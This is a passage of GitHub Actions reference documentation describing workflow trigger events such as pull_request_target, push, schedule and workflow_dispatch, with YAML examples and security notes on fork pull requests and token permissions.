permissions in pull requests from forked repositories. For more information, see [Automatic token authentication](https://docs.github.com/en/actions/security-guides/automatic-token-authentication).\n\n#### [Pull request events for forked repositories](#pull-request-events-for-forked-repositories)\n\nFor pull requests from a forked repository to the base repository, GitHub sends the `pull_request`, `issue_comment`, `pull_request_review_comment`, `pull_request_review`, and `pull_request_target` events to the base repository. No pull request events occur on the forked repository.\n\nWhen a first-time contributor submits a pull request to a public repository, a maintainer with write access may need to approve running workflows on the pull request. For more information, see [Approving workflow runs from public forks](https://docs.github.com/en/actions/managing-workflow-runs/approving-workflow-runs-from-public-forks).\n\nFor pull requests from a forked repository to a private repository, workflows only run when they are enabled, see [Managing GitHub Actions settings for a repository](https://docs.github.com/en/repositories/managing-your-repositorys-settings-and-features/enabling-features-for-your-repository/managing-github-actions-settings-for-a-repository#enabling-workflows-for-forks-of-private-repositories).\n\nNote\n\nWorkflows triggered by Dependabot pull requests are treated as though they are from a forked repository, and are also subject to these restrictions.\n\nTo run your workflow when a comment on a pull request (not on a pull request's diff) is created, edited, or deleted, use the [`issue_comment`](#issue_comment) event. For activity related to pull request reviews or pull request review comments, use the [`pull_request_review`](#pull_request_review) or [`pull_request_review_comment`](#pull_request_review_comment) events.\n\n## [`pull_request_review`](#pull_request_review)\n\nWebhook event payload\n\nActivity types\n\n`GITHUB_SHA`\n\n`GITHUB_REF`\n\n[`pull_request_review`](https://docs.github.com/en/webhooks-and-events/webhooks/webhook-events-and-payloads#pull_request_review)\n\n\\- `submitted`  \n\\- `edited`  \n\\- `dismissed`\n\nLast merge commit on the `GITHUB_REF` branch\n\nPR merge branch `refs/pull/PULL_REQUEST_NUMBER/merge`\n\nNote\n\nMore than one activity type triggers this event. For information about each activity type, see [Webhook events and payloads](https://docs.github.com/en/webhooks-and-events/webhooks/webhook-events-and-payloads#pull_request_review). By default, all activity types trigger workflows that run on this event. You can limit your workflow runs to specific activity types using the `types` keyword. For more information, see [Workflow syntax for GitHub Actions](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#onevent_nametypes).\n\nRuns your workflow when a pull request review is submitted, edited, or dismissed. A pull request review is a group of pull request review comments in addition to a body comment and a state. For activity related to pull request review comments or pull request comments, use the [`pull_request_review_comment`](#pull_request_review_comment) or [`issue_comment`](#issue_comment) events instead. For information about the pull request review APIs, see [Objects](https://docs.github.com/en/graphql/reference/objects#pullrequest) in the GraphQL API documentation or [REST API endpoints for pull requests](https://docs.github.com/en/rest/pulls#reviews).\n\nFor example, you can run a workflow when a pull request review has been `edited` or `dismissed`.\n\n```\non:\n  pull_request_review:\n    types: [edited, dismissed]\n```\n\n### [Running a workflow when a pull request is approved](#running-a-workflow-when-a-pull-request-is-approved)\n\nTo run your workflow when a pull request has been approved, you can trigger your workflow with the `submitted` type of `pull_request_review` event, then check the review state with the `github.event.review.state` property. For example, this workflow will run whenever a pull request review is submitted, but the `approved` job will only run if the submitted review is an approving review:\n\n```\non:\n  pull_request_review:\n    types: [submitted]\n\njobs:\n  approved:\n    if: github.event.review.state == 'approved'\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \"This PR was approved\"\n```\n\n#### [Workflows in forked repositories](#workflows-in-forked-repositories-1)\n\nWorkflows don't run in forked repositories by default. You must enable GitHub Actions in the **Actions** tab of the forked repository.\n\nWith the exception of `GITHUB_TOKEN`, secrets are not passed to the runner when a workflow is triggered from a forked repository. The `GITHUB_TOKEN` has read-only permissions in pull requests from forked repositories. For more information, see [Automatic token authentication](https://docs.github.com/en/actions/security-guides/automatic-token-authentication).\n\n#### [Pull request events for forked repositories](#pull-request-events-for-forked-repositories-1)\n\nFor pull requests from a forked repository to the base repository, GitHub sends the `pull_request`, `issue_comment`, `pull_request_review_comment`, `pull_request_review`, and `pull_request_target` events to the base repository. No pull request events occur on the forked repository.\n\nWhen a first-time contributor submits a pull request to a public repository, a maintainer with write access may need to approve running workflows on the pull request. For more information, see [Approving workflow runs from public forks](https://docs.github.com/en/actions/managing-workflow-runs/approving-workflow-runs-from-public-forks).\n\nFor pull requests from a forked repository to a private repository, workflows only run when they are enabled, see [Managing GitHub Actions settings for a repository](https://docs.github.com/en/repositories/managing-your-repositorys-settings-and-features/enabling-features-for-your-repository/managing-github-actions-settings-for-a-repository#enabling-workflows-for-forks-of-private-repositories).\n\nNote\n\nWorkflows triggered by Dependabot pull requests are treated as though they are from a forked repository, and are also subject to these restrictions.\n\nWebhook event payload\n\nActivity types\n\n`GITHUB_SHA`\n\n`GITHUB_REF`\n\n[`pull_request_review_comment`](https://docs.github.com/en/webhooks-and-events/webhooks/webhook-events-and-payloads#pull_request_review_comment)\n\n\\- `created`  \n\\- `edited`  \n\\- `deleted`\n\nLast merge commit on the `GITHUB_REF` branch\n\nPR merge branch `refs/pull/PULL_REQUEST_NUMBER/merge`\n\nNote\n\nMore than one activity type triggers this event. For information about each activity type, see [Webhook events and payloads](https://docs.github.com/en/webhooks-and-events/webhooks/webhook-events-and-payloads#pull_request_review_comment). By default, all activity types trigger workflows that run on this event. You can limit your workflow runs to specific activity types using the `types` keyword. For more information, see [Workflow syntax for GitHub Actions](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#onevent_nametypes).\n\nRuns your workflow when a pull request review comment is modified. A pull request review comment is a comment on a pull request's diff. For activity related to pull request reviews or pull request comments, use the [`pull_request_review`](#pull_request_review) or [`issue_comment`](#issue_comment) events instead. For information about the pull request review comment APIs, see [Objects](https://docs.github.com/en/graphql/reference/objects#pullrequestreviewcomment) in the GraphQL API documentation or [REST API endpoints for pull requests](https://docs.github.com/en/rest/pulls#comments).\n\nFor example, you can run a workflow when a pull request review comment has been `created` or `deleted`.\n\n```\non:\n  pull_request_review_comment:\n    types: [created, deleted]\n```\n\n#### [Workflows in forked repositories](#workflows-in-forked-repositories-2)\n\nWorkflows don't run in forked repositories by default. You must enable GitHub Actions in the **Actions** tab of the forked repository.\n\nWith the exception of `GITHUB_TOKEN`, secrets are not passed to the runner when a workflow is triggered from a forked repository. The `GITHUB_TOKEN` has read-only permissions in pull requests from forked repositories. For more information, see [Automatic token authentication](https://docs.github.com/en/actions/security-guides/automatic-token-authentication).\n\n#### [Pull request events for forked repositories](#pull-request-events-for-forked-repositories-2)\n\nFor pull requests from a forked repository to the base repository, GitHub sends the `pull_request`, `issue_comment`, `pull_request_review_comment`, `pull_request_review`, and `pull_request_target` events to the base repository. No pull request events occur on the forked repository.\n\nWhen a first-time contributor submits a pull request to a public repository, a maintainer with write access may need to approve running workflows on the pull request. For more information, see [Approving workflow runs from public forks](https://docs.github.com/en/actions/managing-workflow-runs/approving-workflow-runs-from-public-forks).\n\nFor pull requests from a forked repository to a private repository, workflows only run when they are enabled, see [Managing GitHub Actions settings for a repository](https://docs.github.com/en/repositories/managing-your-repositorys-settings-and-features/enabling-features-for-your-repository/managing-github-actions-settings-for-a-repository#enabling-workflows-for-forks-of-private-repositories).\n\nNote\n\nWorkflows triggered by Dependabot pull requests are treated as though they are from a forked repository, and are also subject to these restrictions.\n\n## [`pull_request_target`](#pull_request_target)\n\nWebhook event payload\n\nActivity types\n\n`GITHUB_SHA`\n\n`GITHUB_REF`\n\n[`pull_request`](https://docs.github.com/en/webhooks-and-events/webhooks/webhook-events-and-payloads#pull_request)\n\n\\- `assigned`  \n\\- `unassigned`  \n\\- `labeled`  \n\\- `unlabeled`  \n\\- `opened`  \n\\- `edited`  \n\\- `closed`  \n\\- `reopened`  \n\\- `synchronize`  \n\\- `converted_to_draft`  \n\\- `ready_for_review`  \n\\- `locked`  \n\\- `unlocked`  \n\\- `review_requested`  \n\\- `review_request_removed`  \n\\- `auto_merge_enabled`  \n\\- `auto_merge_disabled`\n\nLast commit on the PR base branch\n\nPR base branch\n\nNote\n\nMore than one activity type triggers this event. For information about each activity type, see [Webhook events and payloads](https://docs.github.com/en/webhooks-and-events/webhooks/webhook-events-and-payloads#pull_request). By default, a workflow only runs when a `pull_request_target` event's activity type is `opened`, `synchronize`, or `reopened`. To trigger workflows by different activity types, use the `types` keyword. For more information, see [Workflow syntax for GitHub Actions](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#onevent_nametypes).\n\nRuns your workflow when activity on a pull request in the workflow's repository occurs. For example, if no activity types are specified, the workflow runs when a pull request is opened or reopened or when the head branch of the pull request is updated.\n\nThis event runs in the context of the base of the pull request, rather than in the context of the merge commit, as the `pull_request` event does. This prevents execution of unsafe code from the head of the pull request that could alter your repository or steal any secrets you use in your workflow. This event allows your workflow to do things like label or comment on pull requests from forks. Avoid using this event if you need to build or run code from the pull request.\n\nTo ensure repository security, branches with names that match certain patterns (such as those which look similar to SHAs) may not trigger workflows with the `pull_request_target` event.\n\nWarning\n\nFor workflows that are triggered by the `pull_request_target` event, the `GITHUB_TOKEN` is granted read/write repository permission unless the `permissions` key is specified and the workflow can access secrets, even when it is triggered from a fork. Although the workflow runs in the context of the base of the pull request, you should make sure that you do not check out, build, or run untrusted code from the pull request with this event. Additionally, any caches share the same scope as the base branch. To help prevent cache poisoning, you should not save the cache if there is a possibility that the cache contents were altered. For more information, see [Keeping your GitHub Actions and workflows secure: Preventing pwn requests](https://securitylab.github.com/research/github-actions-preventing-pwn-requests) on the GitHub Security Lab website.\n\nFor example, you can run a workflow when a pull request has been `assigned`, `opened`, `synchronize`, or `reopened`.\n\n```\non:\n  pull_request_target:\n    types: [assigned, opened, synchronize, reopened]\n```\n\n### [Running your `pull_request_target` workflow based on the head or base branch of a pull request](#running-your-pull_request_target-workflow-based-on-the-head-or-base-branch-of-a-pull-request)\n\nYou can use the `branches` or `branches-ignore` filter to configure your workflow to only run on pull requests that target specific branches. For more information, see [Workflow syntax for GitHub Actions](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#onpull_requestpull_request_targetbranchesbranches-ignore).\n\nFor example, this workflow will run when someone opens a pull request that targets a branch whose name starts with `releases/`:\n\n```\non:\n  pull_request_target:\n    types:\n      - opened\n    branches:\n      - 'releases/**'\n```\n\nNote\n\nIf you use both the `branches` filter and the `paths` filter, the workflow will only run when both filters are satisfied. For example, the following workflow will only run when a pull request that includes a change to a JavaScript (`.js`) file is opened on a branch whose name starts with `releases/`:\n\n```\non:\n  pull_request_target:\n    types:\n      - opened\n    branches:\n      - 'releases/**'\n    paths:\n      - '**.js'\n```\n\nTo run a job based on the pull request's head branch name (as opposed to the pull request's base branch name), use the `github.head_ref` context in a conditional. For example, this workflow will run whenever a pull request is opened, but the `run_if` job will only execute if the head of the pull request is a branch whose name starts with `releases/`:\n\n```\non:\n  pull_request_target:\n    types:\n      - opened\njobs:\n  run_if:\n    if: startsWith(github.head_ref, 'releases/')\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \"The head of this PR starts with 'releases/'\"\n```\n\n### [Running your `pull_request_target` workflow based on files changed in a pull request](#running-your-pull_request_target-workflow-based-on-files-changed-in-a-pull-request)\n\nYou can use the `paths` or `paths-ignore` filter to configure your workflow to run when a pull request changes specific files. For more information, see [Workflow syntax for GitHub Actions](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#onpushpull_requestpull_request_targetpathspaths-ignore).\n\nFor example, this workflow will run when a pull request includes a change to a JavaScript file (`.js`):\n\n```\non:\n  pull_request_target:\n    paths:\n      - '**.js'\n```\n\nNote\n\nIf you use both the `branches` filter and the `paths` filter, the workflow will only run when both filters are satisfied. For example, the following workflow will only run when a pull request that includes a change to a JavaScript (`.js`) file is opened on a branch whose name starts with `releases/`:\n\n```\non:\n  pull_request_target:\n    types:\n      - opened\n    branches:\n      - 'releases/**'\n    paths:\n      - '**.js'\n```\n\n### [Running your `pull_request_target` workflow when a pull request merges](#running-your-pull_request_target-workflow-when-a-pull-request-merges)\n\nWhen a pull request merges, the pull request is automatically closed. To run a workflow when a pull request merges, use the `pull_request_target` `closed` event type along with a conditional that checks the `merged` value of the event. For example, the following workflow will run whenever a pull request closes. The `if_merged` job will only run if the pull request was also merged.\n\n```\non:\n  pull_request_target:\n    types:\n      - closed\n\njobs:\n  if_merged:\n    if: github.event.pull_request.merged == true\n    runs-on: ubuntu-latest\n    steps:\n    - run: |\n        echo The PR was merged\n```\n\n## [`push`](#push)\n\nWebhook event payload\n\nActivity types\n\n`GITHUB_SHA`\n\n`GITHUB_REF`\n\n[`push`](https://docs.github.com/en/webhooks-and-events/webhooks/webhook-events-and-payloads#push)\n\nNot applicable\n\nTip commit pushed to the ref. When you delete a branch, the SHA in the workflow run (and its associated refs) reverts to the default branch of the repository.\n\nUpdated ref\n\nNote\n\nThe webhook payload available to GitHub Actions does not include the `added`, `removed`, and `modified` attributes in the `commit` object. You can retrieve the full commit object using the API. For information, see [Objects](https://docs.github.com/en/graphql/reference/objects#commit) in the GraphQL API documentation or [REST API endpoints for commits](https://docs.github.com/en/rest/commits#get-a-commit).\n\nNote\n\nEvents will not be created if more than 5,000 branches are pushed at once. Events will not be created for tags when more than three tags are pushed at once.\n\nRuns your workflow when you push a commit or tag, or when you create a repository from a template.\n\nFor example, you can run a workflow when the `push` event occurs.\n\n```\non:\n  push\n```\n\nNote\n\nWhen a `push` webhook event triggers a workflow run, the Actions UI's \"pushed by\" field shows the account of the pusher and not the author or committer. However, if the changes are pushed to a repository using SSH authentication with a deploy key, then the \"pushed by\" field will be the repository admin who verified the deploy key when it was added it to a repository.\n\n### [Running your workflow only when a push to specific branches occurs](#running-your-workflow-only-when-a-push-to-specific-branches-occurs)\n\nYou can use the `branches` or `branches-ignore` filter to configure your workflow to only run when specific branches are pushed. For more information, see [Workflow syntax for GitHub Actions](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#onpushbranchestagsbranches-ignoretags-ignore).\n\nFor example, this workflow will run when someone pushes to `main` or to a branch that starts with `releases/`.\n\n```\non:\n  push:\n    branches:\n      - 'main'\n      - 'releases/**'\n```\n\nNote\n\nIf you use both the `branches` filter and the `paths` filter, the workflow will only run when both filters are satisfied. For example, the following workflow will only run when a push that includes a change to a JavaScript (`.js`) file is made to a branch whose name starts with `releases/`:\n\n```\non:\n  push:\n    branches:\n      - 'releases/**'\n    paths:\n      - '**.js'\n```\n\n### [Running your workflow only when a push of specific tags occurs](#running-your-workflow-only-when-a-push-of-specific-tags-occurs)\n\nYou can use the `tags` or `tags-ignore` filter to configure your workflow to only run when specific tags are pushed. For more information, see [Workflow syntax for GitHub Actions](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#onpushbranchestagsbranches-ignoretags-ignore).\n\nFor example, this workflow will run when someone pushes a tag that starts with `v1.`.\n\n```\non:\n  push:\n    tags:\n      - v1.**\n```\n\n### [Running your workflow only when a push affects specific files](#running-your-workflow-only-when-a-push-affects-specific-files)\n\nYou can use the `paths` or `paths-ignore` filter to configure your workflow to run when a push to specific files occurs. For more information, see [Workflow syntax for GitHub Actions](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#onpushpull_requestpull_request_targetpathspaths-ignore).\n\nFor example, this workflow will run when someone pushes a change to a JavaScript file (`.js`):\n\n```\non:\n  push:\n    paths:\n      - '**.js'\n```\n\nNote\n\nIf you use both the `branches` filter and the `paths` filter, the workflow will only run when both filters are satisfied. For example, the following workflow will only run when a push that includes a change to a JavaScript (`.js`) file is made to a branch whose name starts with `releases/`:\n\n```\non:\n  push:\n    branches:\n      - 'releases/**'\n    paths:\n      - '**.js'\n```\n\n## [`registry_package`](#registry_package)\n\nWebhook event payload\n\nActivity types\n\n`GITHUB_SHA`\n\n`GITHUB_REF`\n\n[`registry_package`](https://docs.github.com/en/webhooks-and-events/webhooks/webhook-events-and-payloads#package)\n\n\\- `published`  \n\\- `updated`\n\nCommit of the published package\n\nBranch or tag of the published package\n\nNote\n\nMore than one activity type triggers this event. For information about each activity type, see [Webhook events and payloads](https://docs.github.com/en/webhooks-and-events/webhooks/webhook-events-and-payloads#registry_package). By default, all activity types trigger workflows that run on this event. You can limit your workflow runs to specific activity types using the `types` keyword. For more information, see [Workflow syntax for GitHub Actions](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#onevent_nametypes).\n\nNote\n\nThis event will only trigger a workflow run if the workflow file exists on the default branch.\n\nNote\n\nWhen pushing multi-architecture container images, this event occurs once per manifest, so you might observe your workflow triggering multiple times. To mitigate this, and only run your workflow job for the event that contains the actual image tag information, use a conditional:\n\n```\njobs:\n    job_name:\n        if: $true\n```\n\nRuns your workflow when activity related to GitHub Packages occurs in your repository. For more information, see [GitHub Packages Documentation](https://docs.github.com/en/packages).\n\nFor example, you can run a workflow when a new package version has been `published`.\n\n```\non:\n  registry_package:\n    types: [published]\n```\n\n## [`release`](#release)\n\nWebhook event payload\n\nActivity types\n\n`GITHUB_SHA`\n\n`GITHUB_REF`\n\n[`release`](https://docs.github.com/en/webhooks-and-events/webhooks/webhook-events-and-payloads#release)\n\n\\- `published`  \n\\- `unpublished`  \n\\- `created`  \n\\- `edited`  \n\\- `deleted`  \n\\- `prereleased`  \n\\- `released`\n\nLast commit in the tagged release\n\nTag ref of release `refs/tags/<tag_name>`\n\nNote\n\nMore than one activity type triggers this event. For information about each activity type, see [Webhook events and payloads](https://docs.github.com/en/webhooks-and-events/webhooks/webhook-events-and-payloads#release). By default, all activity types trigger workflows that run on this event. You can limit your workflow runs to specific activity types using the `types` keyword. For more information, see [Workflow syntax for GitHub Actions](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#onevent_nametypes).\n\nNote\n\nWorkflows are not triggered for the `created`, `edited`, or `deleted` activity types for draft releases. When you create your release through the GitHub UI, your release may automatically be saved as a draft.\n\nNote\n\nThe `prereleased` type will not trigger for pre-releases published from draft releases, but the `published` type will trigger. If you want a workflow to run when stable _and_ pre-releases publish, subscribe to `published` instead of `released` and `prereleased`.\n\nRuns your workflow when release activity in your repository occurs. For information about the release APIs, see [Objects](https://docs.github.com/en/graphql/reference/objects#release) in the GraphQL API documentation or [REST API endpoints for releases and release assets](https://docs.github.com/en/rest/releases) in the REST API documentation.\n\nFor example, you can run a workflow when a release has been `published`.\n\n```\non:\n  release:\n    types: [published]\n```\n\n## [`repository_dispatch`](#repository_dispatch)\n\nWebhook event payload\n\nActivity types\n\n`GITHUB_SHA`\n\n`GITHUB_REF`\n\n[repository\\_dispatch](https://docs.github.com/en/webhooks-and-events/webhooks/webhook-events-and-payloads#repository_dispatch)\n\nCustom\n\nLast commit on default branch\n\nDefault branch\n\nNote\n\nThis event will only trigger a workflow run if the workflow file exists on the default branch.\n\nYou can use the GitHub API to trigger a webhook event called [`repository_dispatch`](https://docs.github.com/en/webhooks-and-events/webhooks/webhook-events-and-payloads#repository_dispatch) when you want to trigger a workflow for activity that happens outside of GitHub. For more information, see [REST API endpoints for repositories](https://docs.github.com/en/rest/repos/repos#create-a-repository-dispatch-event).\n\nWhen you make a request to create a `repository_dispatch` event, you must specify an `event_type` to describe the activity type. By default, all `repository_dispatch` activity types trigger a workflow to run. You can use the `types` keyword to limit your workflow to run when a specific `event_type` value is sent in the `repository_dispatch` webhook payload.\n\n```\non:\n  repository_dispatch:\n    types: [test_result]\n```\n\nNote\n\nThe `event_type` value is limited to 100 characters.\n\nAny data that you send through the `client_payload` parameter will be available in the `github.event` context in your workflow. For example, if you send this request body when you create a repository dispatch event:\n\n```\n{\n  \"event_type\": \"test_result\",\n  \"client_payload\": {\n    \"passed\": false,\n    \"message\": \"Error: timeout\"\n  }\n}\n```\n\nthen you can access the payload in a workflow like this:\n\n```\non:\n  repository_dispatch:\n    types: [test_result]\n\njobs:\n  run_if_failure:\n    if: ${{ !github.event.client_payload.passed }}\n    runs-on: ubuntu-latest\n    steps:\n      - env:\n          MESSAGE: ${{ github.event.client_payload.message }}\n        run: echo $MESSAGE\n```\n\nNote\n\n*   The maximum number of top-level properties in `client_payload` is 10.\n*   The payload can contain a maximum of 65,535 characters.\n\n## [`schedule`](#schedule)\n\nWebhook event payload\n\nActivity types\n\n`GITHUB_SHA`\n\n`GITHUB_REF`\n\nNot applicable\n\nNot applicable\n\nLast commit on default branch\n\nDefault branch\n\nNote\n\n*   The `schedule` event can be delayed during periods of high loads of GitHub Actions workflow runs. High load times include the start of every hour. If the load is sufficiently high enough, some queued jobs may be dropped. To decrease the chance of delay, schedule your workflow to run at a different time of the hour.\n    \n*   This event will only trigger a workflow run if the workflow file is on the default branch.\n    \n*   Scheduled workflows will only run on the default branch.\n    \n*   In a public repository, scheduled workflows are automatically disabled when no repository activity has occurred in 60 days. For information on re-enabling a disabled workflow, see [Disabling and enabling a workflow](https://docs.github.com/en/enterprise-server/actions/using-workflows/disabling-and-enabling-a-workflow#enabling-a-workflow).\n    \n*   For an enterprise with Enterprise Managed Users, scheduled workflows will not run if the last `actor` associated with the scheduled workflow has been deprovisioned (and therefore become suspended) by the Enterprise Managed User identity provider (IdP). However, if the last `actor` Enterprise Managed User has not been deprovisioned by the IdP, and has only been removed as a member from a given organization in the enterprise, scheduled workflows will still run with that user set as the `actor`. Similarly, for an enterprise without Enterprise Managed Users, removing a user from an organization will not prevent scheduled workflows which had that user as their `actor` from running. Essentially, triggering a scheduled workflow requires that the status of the `actor` user account associated with the workflow is currently active (i.e. not suspended or deleted). Thus, the _user account's_ status, in both Enterprise Managed User and non-Enterprise Managed User scenarios, is what's important, _not_ the user's _membership status_ in the organization where the scheduled workflow is located.\n    \n*   Certain repository events change the `actor` associated with the workflow. For example, a user who changes the default branch of the repository, which changes the branch on which scheduled workflows run, becomes `actor` for those scheduled workflows.\n    \n*   For a deactivated scheduled workflow, if a user with `write` permissions to the repository makes a commit that changes the `cron` schedule on the workflow, the workflow will be reactivated, and that user will become the `actor` associated with any workflow runs. Note that, in this situation, the workflow is not reactivated by any change to the workflow file; you must alter the `cron` value in the workflow and commit this change.\n    \n    **Example:**\n    \n    ```\n    on:\n      schedule:\n        - cron: \"15 4,5 * * *\"   # <=== Change this value\n    ```\n    \n\nThe `schedule` event allows you to trigger a workflow at a scheduled time.\n\nYou can schedule a workflow to run at specific UTC times using [POSIX cron syntax](https://pubs.opengroup.org/onlinepubs/9699919799/utilities/crontab.html#tag_20_25_07). Scheduled workflows run on the latest commit on the default or base branch. The shortest interval you can run scheduled workflows is once every 5 minutes.\n\nThis example triggers the workflow every day at 5:30 and 17:30 UTC:\n\n```\non:\n  schedule:\n    # * is a special character in YAML so you have to quote this string\n    - cron:  '30 5,17 * * *'\n```\n\nA single workflow can be triggered by multiple `schedule` events. You can access the schedule event that triggered the workflow through the `github.event.schedule` context. This example triggers the workflow to run at 5:30 UTC every Monday-Thursday, but skips the `Not on Monday or Wednesday` step on Monday and Wednesday.\n\n```\non:\n  schedule:\n    - cron: '30 5 * * 1,3'\n    - cron: '30 5 * * 2,4'\n\njobs:\n  test_schedule:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Not on Monday or Wednesday\n        if: github.event.schedule != '30 5 * * 1,3'\n        run: echo \"This step will be skipped on Monday and Wednesday\"\n      - name: Every time\n        run: echo \"This step will always run\"\n```\n\nCron syntax has five fields separated by a space, and each field represents a unit of time.\n\n```\n┌───────────── minute (0 - 59)\n│ ┌───────────── hour (0 - 23)\n│ │ ┌───────────── day of the month (1 - 31)\n│ │ │ ┌───────────── month (1 - 12 or JAN-DEC)\n│ │ │ │ ┌───────────── day of the week (0 - 6 or SUN-SAT)\n│ │ │ │ │\n│ │ │ │ │\n│ │ │ │ │\n* * * * *\n```\n\nYou can use these operators in any of the five fields:\n\nOperator\n\nDescription\n\nExample\n\n\\*\n\nAny value\n\n`15 * * * *` runs at every minute 15 of every hour of every day.\n\n,\n\nValue list separator\n\n`2,10 4,5 * * *` runs at minute 2 and 10 of the 4th and 5th hour of every day.\n\n\\-\n\nRange of values\n\n`30 4-6 * * *` runs at minute 30 of the 4th, 5th, and 6th hour.\n\n/\n\nStep values\n\n`20/15 * * * *` runs every 15 minutes starting from minute 20 through 59 (minutes 20, 35, and 50).\n\nNote\n\nGitHub Actions does not support the non-standard syntax `@yearly`, `@monthly`, `@weekly`, `@daily`, `@hourly`, and `@reboot`.\n\nYou can use [crontab guru](https://crontab.guru/) to help generate your cron syntax and confirm what time it will run. To help you get started, there is also a list of [crontab guru examples](https://crontab.guru/examples.html).\n\nNotifications for scheduled workflows are sent to the user who last modified the cron syntax in the workflow file. For more information, see [Notifications for workflow runs](https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/notifications-for-workflow-runs).\n\n## [`status`](#status)\n\nWebhook event payload\n\nActivity types\n\n`GITHUB_SHA`\n\n`GITHUB_REF`\n\n[`status`](https://docs.github.com/en/webhooks-and-events/webhooks/webhook-events-and-payloads#status)\n\nNot applicable\n\nLast commit on default branch\n\nNot applicable\n\nNote\n\nThis event will only trigger a workflow run if the workflow file exists on the default branch.\n\nRuns your workflow when the status of a Git commit changes. For example, commits can be marked as `error`, `failure`, `pending`, or `success`. If you want to provide more details about the status change, you may want to use the [`check_run`](#check_run) event. For information about the commit status APIs, see [Objects](https://docs.github.com/en/graphql/reference/objects#status) in the GraphQL API documentation or [REST API endpoints for commits](https://docs.github.com/en/rest/commits#commit-statuses).\n\nFor example, you can run a workflow when the `status` event occurs.\n\n```\non:\n  status\n```\n\nIf you want to run a job in your workflow based on the new commit state, you can use the `github.event.state` context. For example, the following workflow triggers when a commit status changes, but the `if_error_or_failure` job only runs if the new commit state is `error` or `failure`.\n\n```\non:\n  status\njobs:\n  if_error_or_failure:\n    runs-on: ubuntu-latest\n    if: >-\n      github.event.state == 'error' ||\n      github.event.state == 'failure'\n    steps:\n      - env:\n          DESCRIPTION: ${{ github.event.description }}\n        run: |\n          echo The status is error or failed: $DESCRIPTION\n```\n\n## [`watch`](#watch)\n\nWebhook event payload\n\nActivity types\n\n`GITHUB_SHA`\n\n`GITHUB_REF`\n\n[`watch`](https://docs.github.com/en/webhooks-and-events/webhooks/webhook-events-and-payloads#watch)\n\n\\- `started`\n\nLast commit on default branch\n\nDefault branch\n\nNote\n\nMore than one activity type triggers this event. Although only the `started` activity type is supported, specifying the activity type will keep your workflow specific if more activity types are added in the future. For information about each activity type, see [Webhook events and payloads](https://docs.github.com/en/webhooks-and-events/webhooks/webhook-events-and-payloads#watch). By default, all activity types trigger workflows that run on this event. You can limit your workflow runs to specific activity types using the `types` keyword. For more information, see [Workflow syntax for GitHub Actions](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#onevent_nametypes).\n\nNote\n\nThis event will only trigger a workflow run if the workflow file exists on the default branch.\n\nRuns your workflow when the workflow's repository is starred. For information about the pull request APIs, see [Mutations](https://docs.github.com/en/graphql/reference/mutations#addstar) in the GraphQL API documentation or [REST API endpoints for starring](https://docs.github.com/en/rest/activity/starring).\n\nFor example, you can run a workflow when someone stars a repository, which is the `started` activity type for a watch event.\n\n```\non:\n  watch:\n    types: [started]\n```\n\n## [`workflow_call`](#workflow_call)\n\nWebhook event payload\n\nActivity types\n\n`GITHUB_SHA`\n\n`GITHUB_REF`\n\nSame as the caller workflow\n\nNot applicable\n\nSame as the caller workflow\n\nSame as the caller workflow\n\n`workflow_call` is used to indicate that a workflow can be called by another workflow. When a workflow is triggered with the `workflow_call` event, the event payload in the called workflow is the same event payload from the calling workflow. For more information see, [Reusing workflows](https://docs.github.com/en/actions/using-workflows/reusing-workflows).\n\nThe example below only runs the workflow when it's called from another workflow:\n\n```\non: workflow_call\n```\n\n## [`workflow_dispatch`](#workflow_dispatch)\n\nWebhook event payload\n\nActivity types\n\n`GITHUB_SHA`\n\n`GITHUB_REF`\n\n[workflow\\_dispatch](https://docs.github.com/en/webhooks-and-events/webhooks/webhook-events-and-payloads#workflow_dispatch)\n\nNot applicable\n\nLast commit on the `GITHUB_REF` branch or tag\n\nBranch or tag that received dispatch\n\nNote\n\nThis event will only trigger a workflow run if the workflow file exists on the default branch.\n\nTo enable a workflow to be triggered manually, you need to configure the `workflow_dispatch` event. You can manually trigger a workflow run using the GitHub API, GitHub CLI, or the GitHub UI. For more information, see [Manually running a workflow](https://docs.github.com/en/actions/managing-workflow-runs/manually-running-a-workflow).\n\n```\non: workflow_dispatch\n```\n\n### [Providing inputs](#providing-inputs)\n\nYou can configure custom-defined input properties, default input values, and required inputs for the event directly in your workflow. When you trigger the event, you can provide the `ref` and any `inputs`. When the workflow runs, you can access the input values in the `inputs` context. For more information, see [Accessing contextual information about workflow runs](https://docs.github.com/en/actions/learn-github-actions/contexts).\n\nNote\n\n*   The workflow will also receive the inputs in the `github.event.inputs` context. The information in the `inputs` context and `github.event.inputs` context is identical except that the `inputs` context preserves Boolean values as Booleans instead of converting them to strings. The `choice` type resolves to a string and is a single selectable option.\n*   The maximum number of top-level properties for `inputs` is 10.\n*   The maximum payload for `inputs` is 65,535 characters.\n\nThis example defines inputs called `logLevel`, `tags`, and `environment`. You pass values for these inputs to the workflow when you run it. This workflow then prints the values to the log, using the `inputs.logLevel`, `inputs.tags`, and `inputs.environment` context properties.\n\n```\non:\n  workflow_dispatch:\n    inputs:\n      logLevel:\n        description: 'Log level'\n        required: true\n        default: 'warning'\n        type: choice\n        options:\n        - info\n        - warning\n        - debug\n      tags:\n        description: 'Test scenario tags'\n        required: false\n        type: boolean\n      environment:\n        description: 'Environment to run tests against'\n        type: environment\n        required: true\n\njobs:\n  log-the-inputs:\n    runs-on: ubuntu-latest\n    steps:\n      - run: |\n          echo \"Log level: $LEVEL\"\n          echo \"Tags: $TAGS\"\n          echo \"Environment: $ENVIRONMENT\"\n        env:\n          LEVEL: ${{ inputs.logLevel }}\n          TAGS: ${{ inputs.tags }}\n          ENVIRONMENT: ${{ inputs.environment }}\n```\n\nIf you run this workflow from a browser you must enter values for the required inputs manually before the workflow will run.\n\n![Screenshot of a list of workflow runs. A dropdown 